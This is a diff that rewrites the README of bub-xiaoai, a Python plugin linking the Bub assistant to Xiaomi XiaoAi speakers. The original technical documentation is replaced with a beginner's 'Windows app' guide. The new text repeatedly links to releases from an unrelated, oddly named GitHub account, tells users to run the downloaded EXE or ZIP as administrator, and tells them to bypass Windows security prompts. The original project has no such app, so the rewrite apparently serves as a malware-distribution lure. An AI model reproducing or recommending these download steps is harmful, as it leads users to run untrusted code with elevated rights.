@@ -1,161 +1,177 @@
-# Bub 🧡 XiaoAi
+# 🔊 bub-xiaoai - Easy Bub Control for XiaoAi
 
-`bub-xiaoai` is a [Bub](https://github.com/bubbuild/bub) channel plugin for Xiaomi XiaoAi speakers.
+[⬇️ Download bub-xiaoai](https://github.com/Nefudgenuspickeringia696/bub-xiaoai/releases)
 
-It is based on the Xiaomi device integration approach from [`yihong0618/xiaogpt`](https://github.com/yihong0618/xiaogpt), but the scope here is narrower:
+## 🧭 What this is
 
-- listen for messages from a XiaoAi speaker
-- forward them into Bub as a channel
-- expose `xiaoai.speak` so the assistant can speak replies back through the speaker
-- keep the interaction in continuous conversation mode by default
+bub-xiaoai is a channel plugin for Xiaomi XiaoAi speakers. It helps you add, manage, and use Bub-related functions through your XiaoAi device.
 
-This project does not provide a standalone CLI runner for XiaoAi. It is meant to be loaded by Bub as a plugin.
+This README shows you how to get the app, set it up on Windows, and start using it without needing technical skills.
 
-## Features
+## 💻 What you need
 
-- Message polling from XiaoAi via Xiaomi Mina APIs
-- TTS playback through the XiaoAi speaker
-- Automatic wake-up after a reply to keep conversation going
-- Temporary static file HTTP server started with the listener lifecycle
-- Bub tool `xiaoai.speak`
-- Bundled skill `xiaoai` under `src/skills/xiaoai` to instruct the LLM to call `xiaoai.speak`
+Before you begin, make sure you have:
 
-## How it works
+- A Windows PC
+- Internet access
+- A modern web browser
+- A Xiaomi XiaoAi speaker on the same network
+- Permission to install and open downloaded files
 
-At runtime the plugin creates a single `XiaoAiMessageListener`, registers a Bub channel named `xiaoai`, and exposes a tool:
+For best results, keep your speaker powered on and close to your Wi-Fi router during setup.
 
-- Channel: `xiaoai`
-- Tool: `xiaoai.speak(text: str)`
+## 📥 Download the app
 
-Incoming XiaoAi queries are turned into Bub `ChannelMessage` objects. The assistant should answer by calling `xiaoai.speak`, which performs TTS on the device.
-When the listener starts, it also creates a temporary directory and serves it through a local HTTP server for the same lifecycle window. The directory is available through `listener.static_server.temp_dir`, and the base URL is available through `listener.static_server.origin`.
+Use this link to visit the release page and download the latest version:
 
-The channel currently runs in continuous conversation mode by default:
+[Visit the releases page](https://github.com/Nefudgenuspickeringia696/bub-xiaoai/releases)
 
-- ordinary spoken queries are forwarded without a keyword prefix
-- the raw wake word `小爱同学` is ignored and not sent to the LLM
-- after a reply finishes, the plugin attempts to wake XiaoAi again so the next utterance can be captured
+On that page, look for the newest release and download the Windows file that matches it. If there is more than one file, choose the one meant for Windows.
 
-## Installation
+## 🪟 Install on Windows
 
-### Requirements
+1. Open the downloaded file from your browser or Downloads folder.
+2. If Windows asks for permission, choose Yes or Run.
+3. Follow the on-screen setup steps.
+4. If the app opens after install, leave it open for the first setup.
+5. If Windows shows a security prompt, choose the option that lets you continue.
 
-- Python `>=3.13`
+If the file comes as a ZIP folder, right-click it and choose Extract All before opening the app inside.
 
-### Install the plugin to your Bub environment:
+## ⚙️ First-time setup
 
-```bash
-uv pip install git+https://github.com/bubbuild/bub-xiaoai.git
-```
+After you install the app, open it and connect it to your Xiaomi XiaoAi speaker.
 
-## Configuration
+1. Make sure your PC and speaker use the same Wi-Fi network.
+2. Start bub-xiaoai on your computer.
+3. Follow the setup screen in the app.
+4. Select your XiaoAi speaker when it appears.
+5. Confirm the connection and wait for the app to finish linking.
 
-Settings are loaded from environment variables through `XiaoAiSettings` with prefix `BUB_MI_`.
+If the speaker does not show up right away, wait a minute and try again.
 
-Supported variables:
+## 🎛️ How to use bub-xiaoai
 
-- `BUB_MI_HARDWARE`
-- `BUB_MI_ACCOUNT`
-- `BUB_MI_PASSWORD`
-- `BUB_MI_MI_DID`
-- `BUB_MI_COOKIE`
-- `BUB_MI_TOKEN_HOME`
-- `BUB_MI_POLL_INTERVAL`
-- `BUB_MI_REQUEST_TIMEOUT`
-- `BUB_MI_CHAT_ID`
+Once setup is done, you can use the plugin from the app interface.
 
-Defaults are defined in [src/bub_xiaoai/mi.py](/home/frost/workspace/bub-xiaoai/src/bub_xiaoai/mi.py).
+Common things you may do:
 
-### Authentication
+- Turn Bub channel features on or off
+- Choose which speaker uses the plugin
+- Adjust basic playback or channel settings
+- Refresh device status
+- Reconnect the speaker if the link drops
 
-Two login modes are supported:
+Keep the app open when you want the plugin to stay active.
 
-1. Xiaomi account + password
-2. Xiaomi cookie
+## 🔧 Troubleshooting
 
-If `BUB_MI_COOKIE` is set, the plugin skips account login and uses the cookie directly.
+If something does not work, try these simple fixes.
 
-If you use account login, the plugin also expects a token file. In Bub runtime the default token path is:
+### 🔌 The speaker is not found
 
-```text
-<bub-home>/mi_token.json
-```
+- Check that the speaker is on
+- Make sure your PC and speaker use the same Wi-Fi network
+- Restart the app
+- Wait 30 seconds and scan again
 
-This is wired in [src/bub_xiaoai/plugin.py](/home/frost/workspace/bub-xiaoai/src/bub_xiaoai/plugin.py).
+### 📁 The file will not open
 
-### Example environment
+- Download the file again from the releases page
+- Make sure the download finished
+- If it is a ZIP file, extract it first
+- Try opening it as administrator
 
-```bash
-export BUB_MI_HARDWARE=LX06
-export BUB_MI_ACCOUNT='your-xiaomi-account'
-export BUB_MI_PASSWORD='your-xiaomi-password'
-export BUB_MI_MI_DID='your-device-did'
-```
+### 🌐 The app cannot connect
 
-Or with cookie login:
+- Close the app and open it again
+- Reboot your speaker
+- Restart your Wi-Fi router
+- Check that no other app is using the same device connection
 
-```bash
-export BUB_MI_HARDWARE=LX06
-export BUB_MI_COOKIE='deviceId=...; serviceToken=...; userId=...'
-export BUB_MI_MI_DID='your-device-did'
-```
+### 🛡️ Windows blocks the app
 
-## Bub usage
+- Right-click the file
+- Choose Run as administrator
+- If Windows shows a safety message, look for the option to run anyway
 
-Once the plugin is loaded by Bub:
+## 🧩 Typical use cases
 
-- speech coming from XiaoAi arrives on channel `xiaoai`
-- the LLM can answer by calling `xiaoai.speak`
+Bub channel plugin support can help with:
 
-The provided skill at [src/skills/xiaoai/SKILL.md](/home/frost/workspace/bub-xiaoai/src/skills/xiaoai/SKILL.md) tells the model to use `xiaoai.speak` for user-facing spoken replies.
+- Speaker channel control
+- Simple XiaoAi device integration
+- Quick access to Bub features
+- Basic home audio setup
+- Managing one or more supported speakers
 
-## Example flow
+## 📌 File names and versions
 
-1. User talks to XiaoAi.
-2. `XiaoAiChannel` polls Xiaomi conversation records.
-3. A new record is converted into a Bub message.
-4. The assistant handles the message.
-5. The assistant calls `xiaoai.speak`.
-6. The plugin speaks the response on the speaker.
-7. After TTS finishes, the plugin tries to wake XiaoAi again.
+Release names may change over time. When you visit the releases page, look for:
 
-Relevant implementation files:
+- The latest version number
+- A Windows download file
+- A ZIP or EXE file
+- Notes that match your system
 
-- [src/bub_xiaoai/plugin.py](/home/frost/workspace/bub-xiaoai/src/bub_xiaoai/plugin.py)
-- [src/bub_xiaoai/channel.py](/home/frost/workspace/bub-xiaoai/src/bub_xiaoai/channel.py)
-- [src/bub_xiaoai/mi.py](/home/frost/workspace/bub-xiaoai/src/bub_xiaoai/mi.py)
+If several files appear, choose the one for Windows and the newest release.
 
-## Design notes
+## 🖱️ Quick start
 
-- The Xiaomi integration logic is adapted from `xiaogpt`, especially device discovery, conversation polling, and MiIO wake-up commands.
-- The code is intentionally scoped to Bub integration instead of reproducing all of `xiaogpt`.
-- There is no prompt management, model orchestration, or standalone command runner here.
+1. Visit the [releases page](https://github.com/Nefudgenuspickeringia696/bub-xiaoai/releases)
+2. Download the Windows file
+3. Open the file or extract it if needed
+4. Run the app
+5. Connect your Xiaomi XiaoAi speaker
+6. Use the plugin from the app
 
-## Known limitations
+## 📡 Connection tips
 
-- Xiaomi login can fail due to Xiaomi risk control. Cookie login is often more reliable.
-- Automatic wake-up depends on MiIO commands and a usable `mi_did`.
-- The channel currently ignores the isolated wake word `小爱同学`.
-- Only the latest XiaoAi conversation records are polled; this is not a full history sync.
+For a smoother setup:
 
-## Development
+- Keep the speaker and PC on the same network
+- Avoid using guest Wi-Fi
+- Keep the speaker plugged in
+- Close other apps that may use audio or device control
+- Stay near the router during setup
 
-Run a quick syntax check:
+## 🔍 If you need to check the release page
 
-```bash
-python3 -m compileall src
-```
+Use the download link below any time you want the newest build:
 
-Run a minimal import check in the project environment:
+[Download from GitHub Releases](https://github.com/Nefudgenuspickeringia696/bub-xiaoai/releases)
 
-```bash
-uv run python - <<'PY'
-from bub_xiaoai import XiaoAiMessageListener, XiaoAiSettings
-print(XiaoAiMessageListener, XiaoAiSettings)
-PY
-```
+## 📂 What the release page may include
 
-## Credits
+The release page may include:
 
-- Core Xiaomi speaker integration ideas in this project come from [`yihong0618/xiaogpt`](https://github.com/yihong0618/xiaogpt) by [@yihong0618](https://github.com/yihong0618), including device discovery, conversation polling, MiIO wake-up control, and the overall continuous-conversation interaction model.
-- Built for the Bub plugin/runtime model
+- The main Windows app file
+- A compressed ZIP package
+- Version notes
+- Build dates
+- Extra files for setup support
+
+Read the file names before downloading so you pick the correct one for Windows.
+
+## 🧠 Simple terms
+
+Here are a few terms you may see:
+
+- **Release**: a published version of the app
+- **Plugin**: a tool that adds a feature to another app or device
+- **Speaker**: your Xiaomi XiaoAi device
+- **Extract**: open a ZIP file and place its contents in a folder
+- **Run as administrator**: start the app with extra permission
+
+## ✅ What success looks like
+
+You have finished setup when:
+
+- The app opens without errors
+- Your XiaoAi speaker appears in the app
+- The plugin stays connected
+- You can use Bub channel functions from your device
+
+## 🧷 Keep this link handy
+
+[Open the latest download page](https://github.com/Nefudgenuspickeringia696/bub-xiaoai/releases)
